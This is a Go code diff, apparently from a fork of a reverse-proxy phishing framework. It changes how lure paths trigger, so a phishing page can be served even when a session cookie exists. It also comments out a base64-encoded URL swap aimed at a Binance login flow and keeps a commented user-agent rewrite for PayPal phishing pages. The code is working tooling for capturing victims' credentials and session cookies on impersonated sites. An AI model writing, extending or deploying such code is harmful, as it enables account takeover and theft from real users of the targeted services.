@@ -228,22 +228,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					//_, err = req.Cookie(p.cookiebot)
-					//testss := GenRandomString(4)
-					//_, err2 := req.Cookie(testss)
-					//if err2 != nil {
-					//	log.Error("Error COOKies %s", err2)
-					//}
-					//log.Warning("COOKIE NAME : %s", p.cookieName)
-					//log.Warning("COOKIE : %s", sc.Value)
-					//log.Warning(req.)
-					if err != nil && !p.isWhitelistedIP(remote_addr) {
+					l, lerr := p.cfg.GetLureByPath(pl_name, req_path)
+					if (err != nil && !p.isWhitelistedIP(remote_addr)) || l != nil {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							var vv string
 							var uv url.Values
-							l, err := p.cfg.GetLureByPath(pl_name, req_path)
-							//log.Warning("PL NAME : %s", pl_name)
-							if err == nil {
+							if lerr == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
 							} else {
 								uv = req.URL.Query()
@@ -465,7 +455,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 // 				//     Replace Any User Agent With Firefox UserAgent ( To fix Paypal phishlet issues in chromium Browser )
 // 				useragent := req.Header.Get("User-Agent")
 // 				if useragent != "" {
-// 							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0")
+// 							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; //Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0")
 // 							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 ", ps.Index)
 // 				}
 
@@ -491,9 +481,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw==" { // https://accounts.binance.us:443
-								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw==" // https://accounts.anydomain.com:443
-							}
+// 								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw==" { // https://accounts.binance.us:443
+// 								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw==" // https://accounts.anydomain.com:443
+// 							}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
